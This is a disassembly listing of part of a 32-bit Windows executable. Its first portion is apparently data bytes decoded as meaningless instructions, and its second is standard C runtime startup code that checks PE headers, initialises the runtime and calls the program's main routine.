  42233d:	adc    al,0x7c
  42233f:	xchg   DWORD PTR [eax+ebx*4+0x1e8e29de],ecx
  422346:	jns    0x42235c
  422348:	mov    dl,bh
  42234a:	enter  0x8567,0xd0
  42234e:	inc    esp
  42234f:	leave  
  422350:	mov    WORD PTR [edx+0x60737c91],ss
  422356:	push   eax
  422357:	imul   esi,esi,0xffffffaf
  42235a:	jbe    0x422357
  42235c:	jmp    0x12357a29
  422361:	aam    0xb8
  422363:	mov    WORD PTR [edx+ebp*2],?
  422366:	loopne 0x422322
  422368:	add    eax,0xf478aa95
  42236d:	mov    ch,0xf
  42236f:	pop    esp
  422370:	stos   BYTE PTR es:[edi],al
  422371:	int    0xe
  422373:	xor    ch,0x67
  422376:	ja     0x4222fd
  422378:	cs retf 
  42237a:	jmp    0x5e78bd03
  42237f:	ficom  WORD PTR [ebx+ebp*2]
  422382:	mov    esi,0x4734796c
  422387:	mov    ch,0xdc
  422389:	cmp    DWORD PTR [ebx+0x2b],0xffffffc2
  42238d:	sub    ah,BYTE PTR [ebx-0x72]
  422390:	arpl   WORD PTR [eax+0x42],bp
  422393:	fs int3 
  422395:	scas   al,BYTE PTR es:[edi]
  422396:	popf   
  422397:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422398:	add    edx,DWORD PTR [edi+0x609d390b]
  42239e:	jo     0x422392
  4223a0:	xor    ecx,esi
  4223a2:	add    DWORD PTR ds:0xba710151,ebx
  4223a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223a9:	add    al,0xd4
  4223ab:	add    ch,cl
  4223ad:	lahf   
  4223ae:	sub    eax,edx
  4223b0:	ja     0x422418
  4223b2:	pop    ss
  4223b3:	mov    al,bh
  4223b5:	jno    0x422358
  4223b7:	enter  0x50b7,0xe3
  4223bb:	and    DWORD PTR [ebx+0xc],esi
  4223be:	add    edx,DWORD PTR [esi-0x52]
  4223c1:	dec    esp
  4223c2:	mov    bl,0xb
  4223c4:	cs js  0x42242c
  4223c7:	scas   eax,DWORD PTR es:[edi]
  4223c8:	stc    
  4223c9:	neg    DWORD PTR [ebx]
  4223cb:	inc    edx
  4223cc:	dec    edx
  4223cd:	xchg   BYTE PTR [esi+0x2f],cl
  4223d0:	outs   dx,DWORD PTR ds:[esi]
  4223d1:	sub    ch,BYTE PTR [edi-0x19]
  4223d4:	inc    ebx
  4223d5:	icebp  
  4223d6:	push   0x61
  4223d8:	push   0xa697ced8
  4223dd:	sub    eax,0x154f701e
  4223e2:	stc    
  4223e3:	xchg   esp,eax
  4223e4:	outs   dx,DWORD PTR ds:[esi]
  4223e5:	stos   BYTE PTR es:[edi],al
  4223e6:	ret    0x1a58
  4223e9:	sub    edi,DWORD PTR [ecx]
  4223eb:	xor    BYTE PTR [eax+eax*8+0x48533430],ah
  4223f2:	or     BYTE PTR [edi-0x6c],0x48
  4223f6:	mov    cl,0xbe
  4223f8:	repz ret 0xe95d
  4223fc:	sbb    ecx,DWORD PTR [esi-0xa7f765b]
  422402:	push   es
  422403:	js     0x4223c9
  422405:	cmp    eax,DWORD PTR [ebx+0x2d]
  422408:	jo     0x42240c
  42240a:	or     eax,0x8406dd53
  42240f:	push   ecx
  422410:	je     0x42243c
  422412:	mov    ch,0x25
  422414:	jg     0x42243c
  422416:	add    cx,0x56b0
  42241b:	ret    0xc967
  42241e:	cmp    edx,DWORD PTR ss:[eax]
  422421:	push   es
  422422:	push   ebp
  422423:	push   cs
  422424:	xlat   BYTE PTR gs:[ebx]
  422426:	ss pushf 
  422428:	in     al,dx
  422429:	xchg   ebx,eax
  42242a:	enter  0x81fc,0xb4
  42242e:	fwait
  42242f:	sbb    eax,0x80a6b46
  422434:	push   cs
  422435:	mov    es,WORD PTR [esi]
  422437:	(bad)  
  422439:	fs pop edi
  42243b:	sub    al,0xf2
  42243d:	mov    esi,esp
  42243f:	loop   0x4224b9
  422441:	inc    esp
  422442:	sti    
  422443:	repnz (bad) 
  422445:	lock in al,0x62
  422448:	mov    al,0x13
  42244a:	fmul   QWORD PTR [ebx+ebp*2+0x27]
  42244e:	loope  0x4223ed
  422450:	xchg   ecx,eax
  422451:	push   ebx
  422452:	rcl    BYTE PTR [edx-0x7b],1
  422455:	push   ebx
  422456:	push   ds
  422457:	js     0x4223f4
  422459:	into   
  42245a:	test   dl,al
  42245c:	outs   dx,BYTE PTR ds:[esi]
  42245d:	mov    eax,0x2347fbb7
  422462:	adc    al,0xd5
  422464:	jnp    0x422408
  422466:	dec    ebp
  422467:	sub    ebx,DWORD PTR [eax+eax*4-0x41698eca]
  42246e:	xchg   ebp,eax
  42246f:	in     al,dx
  422470:	pop    esp
  422471:	repnz bound edi,QWORD PTR [ebx]
  422474:	push   ds
  422475:	mov    al,ds:0xe9b2ad1
  42247a:	adc    al,0xf9
  42247c:	loop   0x4224c8
  42247e:	scas   eax,DWORD PTR es:[edi]
  42247f:	pop    ss
  422480:	mov    ds:0x49fd5b5c,eax
  422485:	xchg   ecx,eax
  422486:	sub    bh,BYTE PTR [ebx]
  422488:	add    BYTE PTR [ebx-0x42],bl
  42248b:	pop    esp
  42248c:	dec    esi
  42248d:	aam    0x83
  42248f:	inc    esp
  422490:	xchg   ecx,eax
  422491:	dec    edi
  422492:	push   0x14
  422494:	pop    ebx
  422495:	sub    eax,0x2c9168c1
  42249a:	add    BYTE PTR [eax],bh
  42249c:	lsl    ebp,dx
  42249f:	(bad)  
  4224a0:	jns    0x4224ab
  4224a2:	jae    0x422510
  4224a4:	out    dx,eax
  4224a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224a6:	leave  
  4224a7:	cs push eax
  4224a9:	pop    ecx
  4224aa:	jge    0x422444
  4224ac:	xchg   edi,eax
  4224ad:	in     eax,0xe9
  4224af:	inc    ecx
  4224b0:	xchg   edi,eax
  4224b1:	inc    edx
  4224b2:	cwde   
  4224b3:	repnz mov ecx,0xc1d77eb1
  4224b9:	loope  0x42245f
  4224bb:	test   eax,0xe973d1de
  4224c0:	and    BYTE PTR [eax+0x42],dh
  4224c3:	lods   eax,DWORD PTR ds:[esi]
  4224c4:	ror    BYTE PTR [esi+ebp*4+0x27232e6c],0x8f
  4224cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4224cd:	into   
  4224ce:	inc    edx
  4224cf:	jmp    0x130ca2bf
  4224d4:	xor    BYTE PTR [edi+0x107b66d4],dh
  4224da:	or     al,0x4b
  4224dc:	dec    edi
  4224dd:	and    al,0x2
  4224df:	mov    ecx,0x7cf354df
  4224e4:	or     dh,BYTE PTR ds:[esi-0x4190860c]
  4224eb:	mov    bl,0xa1
  4224ed:	push   esi
  4224ee:	sbb    DWORD PTR [edi],edi
  4224f0:	ror    DWORD PTR [ebp+0x38],1
  4224f3:	ss cmp al,0x2c
  4224f6:	xor    edi,DWORD PTR [esi]
  4224f8:	jne    0x422569
  4224fa:	jnp    0x422489
  4224fc:	add    esi,DWORD PTR [ebx]
  4224fe:	popf   
  4224ff:	adc    al,0xd7
  422501:	cmp    BYTE PTR [esi],bl
  422503:	or     eax,0xbd688010
  422508:	loop   0x42250d
  42250a:	iret   
  42250b:	xchg   ebx,eax
  42250c:	aam    0x6b
  42250e:	repnz test eax,0xc4c702b9
  422514:	cmp    DWORD PTR [ebx-0x10],edi
  422517:	push   esi
  422518:	(bad)  [eax+ebp*8]
  42251b:	or     DWORD PTR [edx-0x6ea22c47],esp
  422521:	jmp    0x31e9:0x180aff95
  422528:	retf   0x45ce
  42252b:	jl     0x4224e1
  42252d:	xchg   esi,eax
  42252e:	xor    BYTE PTR [edi+0x24],0x29
  422532:	shl    BYTE PTR [esi+0x46],1
  422535:	ds cdq 
  422537:	jmp    0x4224c0
  422539:	and    eax,0x5e10625
  42253e:	lds    ebp,FWORD PTR [esi]
  422540:	popa   
  422541:	jp     0x4224c9
  422543:	stos   BYTE PTR es:[edi],al
  422544:	push   ebp
  422545:	pop    ebp
  422546:	and    dl,bh
  422548:	mov    ebp,0x172ffe6c
  42254d:	push   ebx
  42254e:	pushf  
  42254f:	addr16 pop ebx
  422551:	mov    edi,0xa90c63b0
  422556:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422557:	sbb    DWORD PTR [esi+0x78c74c04],esp
  42255d:	xor    al,BYTE PTR [ebx]
  42255f:	(bad)  
  422560:	lahf   
  422561:	loope  0x4225cb
  422563:	xor    DWORD PTR [esi+edi*8-0x79],ebp
  422567:	mov    ecx,0xd3f5973c
  42256c:	jge    0x4225d1
  42256e:	or     al,0x9f
  422570:	push   edi
  422571:	loopne 0x42258f
  422573:	mov    ds:0x60666925,eax
  422578:	and    al,0x50
  42257a:	mov    ebp,DWORD PTR [edx+0x537ddf21]
  422580:	pop    edx
  422581:	into   
  422582:	loope  0x422595
  422584:	inc    esi
  422585:	inc    edx
  422586:	jp     0x4225e8
  422588:	push   0x2a83155b
  42258d:	adc    ecx,eax
  42258f:	jo     0x42254b
  422591:	or     eax,0x81668155
  422596:	popf   
  422597:	imul   eax,DWORD PTR [edx+0x2c],0x4c
  42259b:	sub    al,0xae
  42259d:	mov    ebp,DWORD PTR [edi]
  42259f:	sub    ch,bh
  4225a1:	or     esi,DWORD PTR [ecx-0x490c0919]
  4225a7:	xchg   edi,eax
  4225a8:	inc    esp
  4225a9:	out    0x9e,al
  4225ab:	sub    BYTE PTR [eax+0x579d515c],ah
  4225b1:	mov    eax,0xdaf29c72
  4225b6:	mov    DWORD PTR [eax-0x74],ebx
  4225b9:	push   eax
  4225ba:	jno    0x4225d0
  4225bc:	sub    eax,0x68e3d042
  4225c1:	fimul  DWORD PTR [ebx]
  4225c3:	mov    ebx,0x1b247c16
  4225c8:	neg    edi
  4225ca:	jbe    0x4225a4
  4225cc:	clc    
  4225cd:	push   ss
  4225ce:	ja     0x4225f4
  4225d0:	retf   
  4225d1:	or     DWORD PTR [ebx+0x7daef4da],edi
  4225d7:	or     BYTE PTR [edx],bl
  4225d9:	or     eax,0xdf4c673c
  4225de:	jns    0x4225ab
  4225e0:	rcl    BYTE PTR [ebx],cl
  4225e2:	push   ebp
  4225e3:	fist   WORD PTR [ebp+eax*8-0x33]
  4225e7:	jecxz  0x42264e
  4225e9:	ja     0x42262f
  4225eb:	popa   
  4225ec:	xchg   ecx,eax
  4225ed:	gs ins DWORD PTR es:[edi],dx
  4225ef:	adc    DWORD PTR [ebx+0x63],edx
  4225f2:	pop    ecx
  4225f3:	cld    
  4225f4:	dec    edx
  4225f5:	cmp    eax,0xe7ce7b88
  4225fa:	cmp    BYTE PTR [eax+eax*1-0x6ada0ab],dh
  422601:	out    dx,eax
  422602:	lods   al,BYTE PTR ds:[esi]
  422603:	add    eax,0xe658481e
  422608:	lock stos BYTE PTR es:[edi],al
  42260a:	mov    ds:0x7c275a8f,al
  42260f:	out    0xa1,eax
  422611:	into   
  422612:	inc    esp
  422613:	in     eax,0x5e
  422615:	clc    
  422616:	xor    ebx,DWORD PTR [edx+0x72714909]
  42261c:	and    eax,0x9460b544
  422621:	clc    
  422622:	rol    eax,cl
  422624:	and    bh,bh
  422626:	adc    edx,DWORD PTR [esp+eax*1]
  422629:	sbb    edi,DWORD PTR [edx+0x5cbe7d94]
  42262f:	sbb    eax,0x7576e1fe
  422634:	cli    
  422635:	adc    eax,0xd5fa636b
  42263a:	popa   
  42263b:	xor    eax,0x20f1f8d6
  422640:	inc    ebx
  422641:	xor    eax,0xd6b1d4fe
  422646:	gs scas al,BYTE PTR es:[edi]
  422648:	icebp  
  422649:	stc    
  42264a:	call   0x3d2:0x4276fc04
  422651:	in     eax,dx
  422652:	sbb    edi,DWORD PTR [ecx+0x12ad4df2]
  422658:	ret    
  422659:	retf   0xf69a
  42265c:	pushf  
  42265d:	jmp    0x437e:0xb8cf1f30
  422664:	ss jb  0x4225fb
  422667:	in     al,dx
  422668:	(bad)  
  422669:	out    dx,eax
  42266a:	gs stos BYTE PTR es:[edi],al
  42266c:	fwait
  42266d:	gs rsm 
  422670:	mov    eax,0xe95e65ac
  422675:	jno    0x42265f
  422677:	jno    0x4226a4
  422679:	fwait
  42267a:	xor    dh,al
  42267c:	jb     0x42260f
  42267e:	inc    ecx
  42267f:	sahf   
  422680:	popa   
  422681:	mov    esp,0x1ee18dd7
  422686:	add    BYTE PTR [ebx],dl
  422688:	add    al,cl
  42268a:	sbb    DWORD PTR [edx],esi
  42268c:	pop    eax
  42268d:	push   ecx
  42268e:	les    eax,FWORD PTR cs:[edi-0x3c]
  422692:	cmc    
  422693:	mov    ds:0xd9b28b23,eax
  422698:	aaa    
  422699:	push   edi
  42269a:	mov    dh,0x99
  42269c:	in     eax,dx
  42269d:	sub    BYTE PTR [ebp-0x7269e612],0x5
  4226a4:	and    DWORD PTR [edx+eiz*4-0x40],ebx
  4226a8:	je     0x422672
  4226aa:	sbb    al,0x2d
  4226ac:	mov    al,0xd5
  4226ae:	jne    0x422656
  4226b0:	imul   esi,DWORD PTR [eax],0x40
  4226b3:	sub    esi,DWORD PTR [eax-0x11]
  4226b6:	or     esi,DWORD PTR [ebx+0x26]
  4226b9:	mov    eax,0xec6cc08b
  4226be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226bf:	fmul   st(0),st
  4226c1:	mov    esi,0xbb8bcba2
  4226c6:	fcom   QWORD PTR [edi*2-0x1b3d4dae]
  4226cd:	pop    ds
  4226ce:	es jle 0x4226f7
  4226d1:	xor    eax,0xd125c4f9
  4226d6:	or     BYTE PTR [ecx],dl
  4226d8:	xchg   BYTE PTR [edi+0x3adcf4e9],ah
  4226de:	dec    eax
  4226df:	dec    edi
  4226e0:	pop    esi
  4226e1:	dec    edi
  4226e2:	xor    esi,ecx
  4226e4:	xor    al,0xc0
  4226e6:	shl    BYTE PTR [ebp+0x60],0x1a
  4226ea:	pop    ss
  4226eb:	push   edx
  4226ec:	stos   BYTE PTR es:[edi],al
  4226ed:	mov    ecx,0x8dcb301f
  4226f2:	mov    ebx,0x3f6e5a90
  4226f7:	daa    
  4226f8:	dec    ebx
  4226f9:	fnstenv [ebx+edx*2+0x11]
  4226fd:	bound  esp,QWORD PTR [eax]
  4226ff:	int3   
  422700:	mov    ds:0xea991009,eax
  422705:	adc    al,0xa9
  422707:	adc    DWORD PTR [ecx-0x56de5709],edi
  42270d:	xchg   ebp,eax
  42270e:	cdq    
  42270f:	pop    ecx
  422710:	xor    DWORD PTR [ecx-0x80],0xffffffca
  422714:	add    eax,edi
  422716:	adc    DWORD PTR [eax],eax
  422718:	popa   
  422719:	sbb    DWORD PTR [eax+0x1058bd44],ecx
  42271f:	cmp    eax,0x430849a8
  422724:	or     BYTE PTR [edx+0x53f7268],dh
  42272a:	or     BYTE PTR [esi-0x6a],bl
  42272d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42272e:	cld    
  42272f:	std    
  422730:	or     al,0xc2
  422732:	pop    eax
  422733:	mov    ebx,eax
  422735:	or     eax,0x34ebc5de
  42273a:	emms   
  42273c:	out    0x51,al
  42273e:	fmul   DWORD PTR [ebp+0x37]
  422741:	std    
  422742:	adc    bl,BYTE PTR [ecx-0x1f]
  422745:	fidiv  WORD PTR [ebx]
  422747:	call   0xff37:0xaa745809
  42274e:	sub    al,0xc8
  422750:	aas    
  422751:	ins    DWORD PTR es:[edi],dx
  422752:	sahf   
  422753:	inc    eax
  422754:	sbb    al,0x7c
  422756:	and    al,0x86
  422758:	lods   ax,WORD PTR ds:[esi]
  42275a:	fwait
  42275b:	sti    
  42275c:	fiadd  WORD PTR ds:0x2252ed10
  422762:	xchg   ebp,eax
  422763:	push   esi
  422764:	mov    WORD PTR [ecx+0x53],fs
  422767:	sbb    BYTE PTR [edi+0x45],dh
  42276a:	(bad)  [esp+ebx*2-0x46b1a043]
  422771:	imul   edx,DWORD PTR [edx+0x41738c5d],0x314b3092
  42277b:	xchg   BYTE PTR [ecx-0x6a34f07b],dh
  422781:	gs xchg ecx,eax
  422783:	lds    edx,FWORD PTR [ebx-0x1b671682]
  422789:	xchg   esp,eax
  42278a:	dec    edx
  42278b:	(bad)  
  42278c:	mov    BYTE PTR [ebx-0x53],dh
  42278f:	and    DWORD PTR [edi-0x7c],eax
  422792:	lea    ebp,[esi-0x13a7772f]
  422798:	mov    ebp,0x3f83cd7d
  42279d:	cwde   
  42279e:	cli    
  42279f:	adc    BYTE PTR [eax+0x2030259],dl
  4227a5:	push   edx
  4227a6:	mov    BYTE PTR [esi+edi*2],cl
  4227a9:	sub    al,0xa1
  4227ab:	push   ecx
  4227ac:	mov    al,0xae
  4227ae:	nop
  4227af:	add    eax,edi
  4227b1:	push   ecx
  4227b2:	aad    0x5f
  4227b4:	shl    bh,1
  4227b6:	test   eax,0x10f08ab1
  4227bb:	shl    BYTE PTR [edx+0x6d56e6b8],1
  4227c1:	inc    edx
  4227c2:	sti    
  4227c3:	jecxz  0x42278d
  4227c5:	pop    ds
  4227c6:	inc    esi
  4227c7:	adc    BYTE PTR [ebp-0x65145c28],bl
  4227cd:	std    
  4227ce:	scas   eax,DWORD PTR es:[edi]
  4227cf:	out    0xe3,eax
  4227d1:	mov    ds:0xb6aabad9,eax
  4227d6:	ret    0xa605
  4227d9:	shl    BYTE PTR [ebp+eax*8+0x2dce08de],1
  4227e0:	stos   BYTE PTR es:[edi],al
  4227e1:	mov    edi,0x2c513b8f
  4227e6:	push   ss
  4227e7:	inc    ecx
  4227e8:	test   DWORD PTR [edi+0x2f631976],0x1cf29784
  4227f2:	jo     0x4227f4
  4227f4:	and    al,0x87
  4227f6:	or     eax,0x4f5af021
  4227fb:	(bad)  
  4227fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4227fd:	not    DWORD PTR [eax]
  4227ff:	inc    edx
  422800:	pop    DWORD PTR [esi+0x7a]
  422803:	rcl    esp,0x37
  422806:	aas    
  422807:	pusha  
  422808:	adc    al,0xf4
  42280a:	xchg   esp,eax
  42280b:	jne    0x4227f6
  42280d:	push   0x1
  42280f:	leave  
  422810:	pop    es
  422811:	add    bh,BYTE PTR [edx-0x2a]
  422814:	xchg   ecx,eax
  422815:	stos   BYTE PTR es:[edi],al
  422816:	iret   
  422817:	dec    ebx
  422818:	add    BYTE PTR [ebx-0x693cb588],ah
  42281e:	sub    cl,cl
  422820:	or     BYTE PTR [ecx+0x7e181aa0],cl
  422826:	jmp    0xc591:0x345e9c2a
  42282d:	jg     0x4227e7
  42282f:	pop    eax
  422830:	inc    eax
  422831:	jns    0x4227ef
  422833:	push   ecx
  422834:	ins    DWORD PTR es:[edi],dx
  422835:	jg     0x4227ea
  422837:	rol    BYTE PTR [edx-0x2336a497],0xbf
  42283e:	in     al,dx
  42283f:	sti    
  422840:	xchg   ah,dh
  422842:	jmp    0x3d5a:0x3fa8871a
  422849:	cwde   
  42284a:	mov    BYTE PTR [edi],0x9
  42284d:	mov    ebx,0x4d5a9ee5
  422852:	outs   dx,BYTE PTR ds:[esi]
  422853:	adc    ecx,edx
  422855:	pop    ss
  422856:	adc    BYTE PTR [edx-0x29],cl
  422859:	loopne 0x4228c4
  42285b:	xchg   edx,eax
  42285c:	jl     0x422869
  42285e:	mov    edi,0x38c138bd
  422863:	sbb    DWORD PTR [ebx+0x5f],edi
  422866:	or     ah,ch
  422868:	inc    esi
  422869:	retf   0x8000
  42286c:	jge    0x4228a1
  42286e:	iret   
  42286f:	adc    bl,BYTE PTR [esi]
  422871:	mov    eax,0x227bce13
  422876:	in     eax,dx
  422877:	test   al,0xfa
  422879:	push   ss
  42287a:	cwde   
  42287b:	dec    ecx
  42287c:	sub    eax,0xe09b9166
  422881:	mov    esi,ebx
  422883:	dec    edi
  422884:	jmp    0xc50f:0xaa68999a
  42288b:	jb     0x4228b9
  42288d:	xor    ch,BYTE PTR [eax]
  42288f:	(bad)  
  422890:	fisttp QWORD PTR [edx]
  422892:	(bad)  
  422893:	cli    
  422894:	fwait
  422895:	sbb    DWORD PTR [ecx-0x2b5f2ae9],edi
  42289b:	sbb    DWORD PTR [edi-0x65],esp
  42289e:	fcom   QWORD PTR [edi+0x248e7490]
  4228a4:	out    0xed,eax
  4228a6:	inc    esp
  4228a7:	jecxz  0x422857
  4228a9:	hlt    
  4228aa:	dec    esi
  4228ab:	es test al,0xb8
  4228ae:	stc    
  4228af:	lock dec eax
  4228b1:	call   0xa37b9e3f
  4228b6:	je     0x42290e
  4228b8:	xor    ah,bh
  4228ba:	mov    DWORD PTR [eax+eax*8+0x7],edx
  4228be:	sar    BYTE PTR ds:0x7411db23,0x75
  4228c5:	aaa    
  4228c6:	push   esp
  4228c7:	inc    eax
  4228c8:	mov    edx,0xb1611afb
  4228cd:	mov    ds:0x899bfb44,al
  4228d2:	scas   al,BYTE PTR es:[edi]
  4228d3:	ror    BYTE PTR [edi+0x44],0xf0
  4228d7:	ja     0x422898
  4228d9:	jne    0x422902
  4228db:	nop
  4228dc:	cdq    
  4228dd:	stc    
  4228de:	div    BYTE PTR [esi+eax*2]
  4228e1:	inc    bp
  4228e3:	pop    ss
  4228e4:	or     BYTE PTR [edi+0x35],bh
  4228e7:	jmp    0xfd6d6f48
  4228ec:	mov    al,cl
  4228ee:	mov    bl,0x27
  4228f0:	or     al,BYTE PTR [ecx]
  4228f2:	nop
  4228f3:	pushf  
  4228f4:	loope  0x4228c6
  4228f6:	push   edi
  4228f7:	inc    edi
  4228f8:	out    dx,al
  4228f9:	xlat   BYTE PTR ds:[ebx]
  4228fa:	shl    BYTE PTR [edi],cl
  4228fc:	push   0xffffff91
  4228fe:	mov    ds:0x833d8ab6,eax
  422903:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422904:	push   ss
  422905:	shl    DWORD PTR [edx+0x58],cl
  422908:	pusha  
  422909:	dec    ebx
  42290a:	ret    0x7223
  42290d:	in     eax,0xc9
  42290f:	jae    0x422984
  422911:	iret   
  422912:	dec    esp
  422913:	mov    dl,0xcb
  422915:	and    eax,0xf7ad4233
  42291a:	hlt    
  42291b:	mov    bh,bl
  42291d:	mov    edx,0x88a14ab3
  422922:	inc    esp
  422923:	fs aad 0xd1
  422926:	mov    DWORD PTR [eax],esp
  422928:	dec    edx
  422929:	sbb    dl,cl
  42292b:	mov    ebp,0x1250b1da
  422930:	dec    edx
  422931:	xor    BYTE PTR [edx-0x7ea684d3],dl
  422937:	fdiv   QWORD PTR [eax+0x67590f9]
  42293d:	pop    ss
  42293e:	or     BYTE PTR [edi+0x19896206],dh
  422944:	fsubr  QWORD PTR [ebx]
  422946:	scas   al,BYTE PTR es:[edi]
  422947:	hlt    
  422948:	loopne 0x4229ab
  42294a:	push   ecx
  42294b:	test   eax,0x9233c2fe
  422950:	dec    edi
  422951:	pop    ds
  422952:	scas   eax,DWORD PTR es:[edi]
  422953:	adc    DWORD PTR [ebx],esp
  422955:	in     eax,0x1
  422957:	fidivr DWORD PTR [eax]
  422959:	and    eax,0xc483c033
  42295e:	adc    dl,al
  422960:	adc    BYTE PTR [eax],al
  422962:	nop
  422963:	nop
  422964:	nop
  422965:	nop
  422966:	nop
  422967:	nop
  422968:	nop
  422969:	nop
  42296a:	nop
  42296b:	nop
  42296c:	nop
  42296d:	nop
  42296e:	nop
  42296f:	nop
  422970:	cmp    DWORD PTR ds:0x45cabc,0x1
  422977:	jne    0x42297e
  422979:	call   0x422ebc
  42297e:	push   DWORD PTR [esp+0x4]
  422982:	call   0x422d45
  422987:	push   0xff
  42298c:	call   DWORD PTR ds:0x45c1c0
  422992:	pop    ecx
  422993:	pop    ecx
  422994:	ret    
  422995:	cmp    DWORD PTR ds:0x45cabc,0x1
  42299c:	jne    0x4229a3
  42299e:	call   0x422ebc
  4229a3:	push   DWORD PTR [esp+0x4]
  4229a7:	call   0x422d45
  4229ac:	push   0xff
  4229b1:	call   0x422b8b
  4229b6:	pop    ecx
  4229b7:	pop    ecx
  4229b8:	ret    
  4229b9:	push   0x60
  4229bb:	push   0x428118
  4229c0:	call   0x4238a8
  4229c5:	mov    edi,0x94
  4229ca:	mov    eax,edi
  4229cc:	call   0x423900
  4229d1:	mov    DWORD PTR [ebp-0x18],esp
  4229d4:	mov    esi,esp
  4229d6:	mov    DWORD PTR [esi],edi
  4229d8:	push   esi
  4229d9:	call   DWORD PTR ds:0x428028
  4229df:	mov    ecx,DWORD PTR [esi+0x10]
  4229e2:	mov    DWORD PTR ds:0x45cac4,ecx
  4229e8:	mov    eax,DWORD PTR [esi+0x4]
  4229eb:	mov    ds:0x45cad0,eax
  4229f0:	mov    edx,DWORD PTR [esi+0x8]
  4229f3:	mov    DWORD PTR ds:0x45cad4,edx
  4229f9:	mov    esi,DWORD PTR [esi+0xc]
  4229fc:	and    esi,0x7fff
  422a02:	mov    DWORD PTR ds:0x45cac8,esi
  422a08:	cmp    ecx,0x2
  422a0b:	je     0x422a19
  422a0d:	or     esi,0x8000
  422a13:	mov    DWORD PTR ds:0x45cac8,esi
  422a19:	shl    eax,0x8
  422a1c:	add    eax,edx
  422a1e:	mov    ds:0x45cacc,eax
  422a23:	xor    esi,esi
  422a25:	push   esi
  422a26:	mov    edi,DWORD PTR ds:0x428018
  422a2c:	call   edi
  422a2e:	cmp    WORD PTR [eax],0x5a4d
  422a33:	jne    0x422a54
  422a35:	mov    ecx,DWORD PTR [eax+0x3c]
  422a38:	add    ecx,eax
  422a3a:	cmp    DWORD PTR [ecx],0x4550
  422a40:	jne    0x422a54
  422a42:	movzx  eax,WORD PTR [ecx+0x18]
  422a46:	cmp    eax,0x10b
  422a4b:	je     0x422a6c
  422a4d:	cmp    eax,0x20b
  422a52:	je     0x422a59
  422a54:	mov    DWORD PTR [ebp-0x1c],esi
  422a57:	jmp    0x422a80
  422a59:	cmp    DWORD PTR [ecx+0x84],0xe
  422a60:	jbe    0x422a54
  422a62:	xor    eax,eax
  422a64:	cmp    DWORD PTR [ecx+0xf8],esi
  422a6a:	jmp    0x422a7a
  422a6c:	cmp    DWORD PTR [ecx+0x74],0xe
  422a70:	jbe    0x422a54
  422a72:	xor    eax,eax
  422a74:	cmp    DWORD PTR [ecx+0xe8],esi
  422a7a:	setne  al
  422a7d:	mov    DWORD PTR [ebp-0x1c],eax
  422a80:	push   0x1
  422a82:	call   0x423857
  422a87:	pop    ecx
  422a88:	test   eax,eax
  422a8a:	jne    0x422a94
  422a8c:	push   0x1c
  422a8e:	call   0x422995
  422a93:	pop    ecx
  422a94:	call   0x4237ce
  422a99:	test   eax,eax
  422a9b:	jne    0x422aa5
  422a9d:	push   0x10
  422a9f:	call   0x422995
  422aa4:	pop    ecx
  422aa5:	call   0x4236b7
  422aaa:	mov    DWORD PTR [ebp-0x4],esi
  422aad:	call   0x4234b9
  422ab2:	test   eax,eax
  422ab4:	jge    0x422abe
  422ab6:	push   0x1b
  422ab8:	call   0x422970
  422abd:	pop    ecx
  422abe:	call   DWORD PTR ds:0x428024
  422ac4:	mov    ds:0x45d274,eax
  422ac9:	call   0x423397
  422ace:	mov    ds:0x45cab4,eax
  422ad3:	call   0x4232f5
  422ad8:	test   eax,eax
  422ada:	jge    0x422ae4
  422adc:	push   0x8
  422ade:	call   0x422970
  422ae3:	pop    ecx
  422ae4:	call   0x4230c2
  422ae9:	test   eax,eax
  422aeb:	jge    0x422af5
  422aed:	push   0x9
  422aef:	call   0x422970
  422af4:	pop    ecx
  422af5:	call   0x422bcd
  422afa:	mov    DWORD PTR [ebp-0x20],eax
  422afd:	cmp    eax,esi
  422aff:	je     0x422b08
  422b01:	push   eax
  422b02:	call   0x422970
  422b07:	pop    ecx
  422b08:	mov    DWORD PTR [ebp-0x38],esi
  422b0b:	lea    eax,[ebp-0x64]
  422b0e:	push   eax
  422b0f:	call   DWORD PTR ds:0x428020
  422b15:	call   0x423059
  422b1a:	mov    DWORD PTR [ebp-0x68],eax
  422b1d:	test   BYTE PTR [ebp-0x38],0x1
  422b21:	je     0x422b29
  422b23:	movzx  eax,WORD PTR [ebp-0x34]
  422b27:	jmp    0x422b2c
  422b29:	push   0xa
  422b2b:	pop    eax
  422b2c:	push   eax
  422b2d:	push   DWORD PTR [ebp-0x68]
  422b30:	push   esi
  422b31:	push   esi
  422b32:	call   edi
  422b34:	push   eax
  422b35:	call   0x421800
  422b3a:	mov    edi,eax
  422b3c:	mov    DWORD PTR [ebp-0x6c],edi
  422b3f:	cmp    DWORD PTR [ebp-0x1c],esi
  422b42:	jne    0x422b4a
  422b44:	push   edi
  422b45:	call   0x422d05
  422b4a:	call   0x422d27
  422b4f:	jmp    0x422b7c
  422b51:	mov    eax,DWORD PTR [ebp-0x14]
  422b54:	mov    ecx,DWORD PTR [eax]
  422b56:	mov    ecx,DWORD PTR [ecx]
  422b58:	mov    DWORD PTR [ebp-0x70],ecx
  422b5b:	push   eax
  422b5c:	push   ecx
  422b5d:	call   0x422ef5
  422b62:	pop    ecx
  422b63:	pop    ecx
  422b64:	ret    
  422b65:	mov    esp,DWORD PTR [ebp-0x18]
  422b68:	mov    edi,DWORD PTR [ebp-0x70]
  422b6b:	cmp    DWORD PTR [ebp-0x1c],0x0
  422b6f:	jne    0x422b77
  422b71:	push   edi
  422b72:	call   0x422d16
  422b77:	call   0x422d36
  422b7c:	or     DWORD PTR [ebp-0x4],0xffffffff
  422b80:	mov    eax,edi
  422b82:	lea    esp,[ebp-0x7c]
  422b85:	call   0x4238e3
  422b8a:	ret    
  422b8b:	push   0x428134
  422b90:	call   DWORD PTR ds:0x428018
  422b96:	test   eax,eax
  422b98:	je     0x422bb0
  422b9a:	push   0x428124
  422b9f:	push   eax
  422ba0:	call   DWORD PTR ds:0x42801c
  422ba6:	test   eax,eax
  422ba8:	je     0x422bb0
  422baa:	push   DWORD PTR [esp+0x4]
  422bae:	call   eax
